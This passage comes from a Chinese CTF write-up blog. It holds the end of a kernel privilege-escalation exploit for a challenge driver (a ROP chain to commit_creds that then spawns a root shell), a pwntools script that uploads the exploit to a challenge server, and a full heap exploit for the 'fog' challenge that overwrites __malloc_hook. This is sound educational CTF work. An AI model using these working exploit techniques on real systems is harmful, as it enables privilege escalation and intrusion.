<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> seq_fd;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> pop_rdi = <span class="number">0xffffffff811cef9d</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> init_cred = <span class="number">0xffffffff81e497c0</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> commit_creds = <span class="number">0xffffffff810a1910</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> swapgs = <span class="number">0xffffffff81063844</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> iretq = <span class="number">0xffffffff81841297</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> ret = <span class="number">0xffffffff8100006f</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    signal(SIGSEGV, get_shell);</span><br><span class="line">    save_status();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *buf = <span class="built_in">malloc</span>(<span class="number">0x2000</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *pointer_buf = <span class="built_in">malloc</span>(<span class="number">0x2000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/dev/test1&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]open test1 error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd1 = open(<span class="string">&quot;/dev/test1&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd1 &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]open test1 error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    write(fd1, buf, <span class="number">0x20</span>);</span><br><span class="line">    close(fd1);</span><br><span class="line">    read(fd, buf, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    seq_fd = open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (seq_fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        errExit(<span class="string">&quot;failed to create stat!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    pointer_buf[<span class="number">0</span>] = <span class="number">0xffffffff81542a59</span>;</span><br><span class="line">    write(fd, pointer_buf, <span class="number">0x20</span>);</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov r15,   0xbeefdead\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r14,   commit_creds\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r13,   init_cred\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r12,   pop_rdi\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rbp,   ret\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rbx,   swapgs\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r11,   iretq\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r10,   iretq\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r9,    0xbeefdead\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r8,    0xbeefdead\n&quot;</span></span><br><span class="line">        <span class="string">&quot;xor rax,   rax\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rcx,   0xbeefdead\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdx,   8\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rsi,   rsp\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdi,   seq_fd\n&quot;</span></span><br><span class="line">        <span class="string">&quot;syscall&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后我之前的上传脚本有点问题，所以修改了一下，这里放一下以后方便拿</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> argv</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;nc.eonew.cn&#x27;</span>, <span class="number">10101</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_file</span>(<span class="params">name, sym</span>):</span></span><br><span class="line">    file = read(name)</span><br><span class="line">    f = b64e(file)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>, <span class="number">1500</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(f) % (<span class="number">1500</span>-i) == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    size = i</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">len</span>(f))</span><br><span class="line">    r.sendlineafter(sym, <span class="string">&quot;cd /tmp&quot;</span>)</span><br><span class="line">    r.sendlineafter(sym, <span class="string">&quot;rm *&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(f) // size + <span class="number">1</span>):</span><br><span class="line">        log.info(<span class="string">&quot;Sending chunk &#123;&#125;/&#123;&#125;&quot;</span>.<span class="built_in">format</span>(i, <span class="built_in">len</span>(f)//size))</span><br><span class="line">        r.sendlineafter(</span><br><span class="line">            sym, <span class="string">&quot;echo -n &#x27;&#123;&#125;&#x27;&gt;&gt;/tmp/exp.gz.b64&quot;</span>.<span class="built_in">format</span>(f[i*<span class="number">967</span>:(i*<span class="number">967</span>)+<span class="number">967</span>]))</span><br><span class="line">    r.sendlineafter(sym, <span class="string">&quot;cat /tmp/exp.gz.b64 | base64 -d &gt;/tmp/exp.gz&quot;</span>)</span><br><span class="line">    r.sendlineafter(sym, <span class="string">&quot;gzip -d /tmp/exp.gz&quot;</span>)</span><br><span class="line">    r.sendlineafter(sym, <span class="string">&quot;chmod +x /tmp/exp&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span>():</span></span><br><span class="line">    sym = <span class="string">&quot;$&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(argv) == <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">if</span> argv[<span class="number">1</span>] == <span class="string">&quot;root&quot;</span>:</span><br><span class="line">            sym = <span class="string">&quot;#&quot;</span></span><br><span class="line">        <span class="keyword">elif</span> argv[<span class="number">1</span>] == <span class="string">&quot;user&quot;</span>:</span><br><span class="line">            sym = <span class="string">&quot;$&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;user or root?&quot;</span>)</span><br><span class="line">            exit()</span><br><span class="line">    os.system(<span class="string">&#x27;rm exp.gz&#x27;</span>)</span><br><span class="line">    os.system(<span class="string">&#x27;cp ./exp ./exp.bak&#x27;</span>)</span><br><span class="line">    os.system(<span class="string">&#x27;gzip ./exp&#x27;</span>)</span><br><span class="line">    os.system(<span class="string">&#x27;mv exp.bak exp&#x27;</span>)</span><br><span class="line">    send_file(<span class="string">&quot;exp.gz&quot;</span>, sym=sym)</span><br><span class="line"></span><br><span class="line">    r.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    exploit()</span><br></pre></td></tr></table></figure><h2 id="fog"><a href="#fog" class="headerlink" title="fog"></a>fog</h2><p>一道比较简单的堆题，不过需要利用一点特性，恰好是我以往不知道的特性。</p><h3 id="fast-bin合并机制"><a href="#fast-bin合并机制" class="headerlink" title="fast bin合并机制"></a>fast bin合并机制</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">    &#123;</span><br><span class="line">      idx = smallbin_index (nb);</span><br><span class="line">      bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((victim = last (bin)) != bin)</span><br><span class="line">        &#123;</span><br><span class="line">          bck = victim-&gt;bk;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>);</span><br><span class="line">          set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">          bin-&gt;bk = bck;</span><br><span class="line">          bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">    set_non_main_arena (victim);</span><br><span class="line">          check_malloced_chunk (av, victim, nb);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">     stash them in the tcache.  */</span></span><br><span class="line">  <span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">  <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">    &#123;</span><br><span class="line">      mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">      <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">     &amp;&amp; (tc_victim = last (bin)) != bin)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      bck = tc_victim-&gt;bk;</span><br><span class="line">      set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">      <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">set_non_main_arena (tc_victim);</span><br><span class="line">      bin-&gt;bk = bck;</span><br><span class="line">      bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">      tcache_put (tc_victim, tc_idx);</span><br><span class="line">            &#125;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">          <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     If this is a large request, consolidate fastbins before continuing.</span></span><br><span class="line"><span class="comment">     While it might look excessive to kill all fastbins before</span></span><br><span class="line"><span class="comment">     even seeing if there is space available, this avoids</span></span><br><span class="line"><span class="comment">     fragmentation problems normally associated with fastbins.</span></span><br><span class="line"><span class="comment">     Also, in practice, programs tend to have runs of either small or</span></span><br><span class="line"><span class="comment">     large requests, but less often mixtures, so consolidation is not</span></span><br><span class="line"><span class="comment">     invoked all that often in most programs. And the programs that</span></span><br><span class="line"><span class="comment">     it is called frequently in otherwise tend to fragment.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      idx = largebin_index (nb);</span><br><span class="line">      <span class="keyword">if</span> (atomic_load_relaxed (&amp;av-&gt;have_fastchunks))</span><br><span class="line">        malloc_consolidate (av);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>在<code>_int_malloc</code>中存在一个我一直没有注意过的细节，可以看到如果我们malloc的size大于smallbin的size就会进行<code>malloc_consolidate</code>，也就是如果size位large bin范围就会进入合并。并且这一个特性在高版本的libc中也同样存在。</p><h3 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h3><p>这里题目比较简单，就是普通的菜单题</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_B1B</span><span class="params">(<span class="keyword">void</span> *a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  LODWORD(result) = read(<span class="number">0</span>, a1, a2);</span><br><span class="line">  *((_BYTE *)a1 + (<span class="keyword">int</span>)result) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析发现这个函数存在off by null漏洞，在create和edit中都有调用。<br>这里还需要了解有另外两点，一是在进行fopen时会产生一个size位0x230的chunk </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">FILE *</span><br><span class="line">__fopen_internal (<span class="keyword">const</span> <span class="keyword">char</span> *filename, <span class="keyword">const</span> <span class="keyword">char</span> *mode, <span class="keyword">int</span> is32)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">locked_FILE</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> <span class="title">fp</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">    _IO_lock_t lock;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> <span class="title">wd</span>;</span></span><br><span class="line">  &#125; *new_f = (struct locked_FILE *) <span class="built_in">malloc</span> (<span class="keyword">sizeof</span> (struct locked_FILE));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (new_f == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  new_f-&gt;fp.file._lock = &amp;new_f-&gt;lock;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  _IO_no_init (&amp;new_f-&gt;fp.file, <span class="number">0</span>, <span class="number">0</span>, &amp;new_f-&gt;wd, &amp;_IO_wfile_jumps);</span><br><span class="line">  _IO_JUMPS (&amp;new_f-&gt;fp) = &amp;_IO_file_jumps;</span><br><span class="line">  _IO_new_file_init_internal (&amp;new_f-&gt;fp);</span><br><span class="line">  <span class="keyword">if</span> (_IO_file_fopen ((FILE *) new_f, filename, mode, is32) != <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> __fopen_maybe_mmap (&amp;new_f-&gt;fp.file);</span><br><span class="line"></span><br><span class="line">  _IO_un_link (&amp;new_f-&gt;fp);</span><br><span class="line">  <span class="built_in">free</span> (new_f);</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>并且在close这里会free掉，还有就是在printf时会产生一个size位large bin范围的chunk，不过这一点我确实没找到相应源码，有师傅知道可以留言一下，并且我在自己写一个测试脚本时也没有产生，但是调试题目时发现确实存在一个size位0x410的chunk。</p><p>知道了上面的内容就很简单了，使用堆合并得到UAF的堆块，随后劫持<code>__malloc_hook</code>位one_gadget即可getshell</p><h3 id="综上，exp-1"><a href="#综上，exp-1" class="headerlink" title="综上，exp"></a>综上，exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./fog&#x27;</span>)</span><br><span class="line"><span class="comment"># r = process(&#x27;./fog&#x27;)</span></span><br><span class="line">r = remote(<span class="string">&#x27;nc.eonew.cn&#x27;</span>, <span class="number">10006</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">data_size, data=<span class="string">b&#x27;\n&#x27;</span></span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Your choice?&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;What size do you want?&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(data_size), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Content: &#x27;</span>)</span><br><span class="line">    r.send(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Your choice?&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Which one do you want to delete?&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(idx), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, data</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Your choice?&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Which one do you want to modify?&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(idx), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;What do you want to input?&#x27;</span>)</span><br><span class="line">    r.send(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Your choice?&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Which one do you want to see?&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(idx), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create(<span class="number">0x68</span>)  <span class="comment"># 0</span></span><br><span class="line">create(<span class="number">0x68</span>)  <span class="comment"># 1</span></span><br><span class="line">create(<span class="number">0x68</span>)  <span class="comment"># 2</span></span><br><span class="line">create(<span class="number">0x68</span>)  <span class="comment"># 3</span></span><br><span class="line">create(<span class="number">0x68</span>)  <span class="comment"># 4</span></span><br><span class="line">create(<span class="number">0x68</span>)  <span class="comment"># 5</span></span><br><span class="line">create(<span class="number">0x68</span>)  <span class="comment"># 6</span></span><br><span class="line">create(<span class="number">0x68</span>)  <span class="comment"># 7</span></span><br><span class="line">create(<span class="number">0x68</span>)  <span class="comment"># 8</span></span><br><span class="line">create(<span class="number">0x68</span>)  <span class="comment"># 9</span></span><br><span class="line">create(<span class="number">0x68</span>)  <span class="comment"># 10</span></span><br><span class="line">create(<span class="number">0x68</span>)  <span class="comment"># 11</span></span><br><span class="line">create(<span class="number">0x68</span>)  <span class="comment"># 12</span></span><br><span class="line">create(<span class="number">0x68</span>, <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x30</span>+flat(<span class="number">0</span>, <span class="number">0x31</span>))  <span class="comment"># 13</span></span><br><span class="line">create(<span class="number">0x68</span>)  <span class="comment"># 14</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">13</span>)</span><br><span class="line">delete(<span class="number">12</span>)</span><br><span class="line">delete(<span class="number">11</span>)</span><br><span class="line">delete(<span class="number">10</span>)</span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">5</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Your choice?&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">edit(<span class="number">8</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x60</span>+p64(<span class="number">0x3f0</span>))</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Your choice?&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x68</span>)  <span class="comment"># 0</span></span><br><span class="line">create(<span class="number">0x68</span>)  <span class="comment"># 1</span></span><br><span class="line">create(<span class="number">0x68</span>)  <span class="comment"># 2</span></span><br><span class="line">create(<span class="number">0x68</span>)  <span class="comment"># 3</span></span><br><span class="line">create(<span class="number">0x68</span>)  <span class="comment"># 4</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">5</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Content : &#x27;</span>)</span><br><span class="line">libc_base = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x3c4b78</span>+<span class="number">0x29000</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">create(<span class="number">0x68</span>)  <span class="comment"># 9</span></span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">edit(<span class="number">9</span>, p64(libc_base+libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]-<span class="number">0x23</span>))</span><br><span class="line">create(<span class="number">0x68</span>)  <span class="comment"># 5</span></span><br><span class="line">create(<span class="number">0x68</span>, <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x13</span>+p64(<span class="number">0x3f42a</span>+libc_base))  <span class="comment"># 10</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base+libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="number">0x3f42a</span>+libc_base))</span><br><span class="line"><span class="comment"># gdb.attach(r, &#x27;b*$rebase(0xC5D)&#x27;)</span></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Your choice?&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 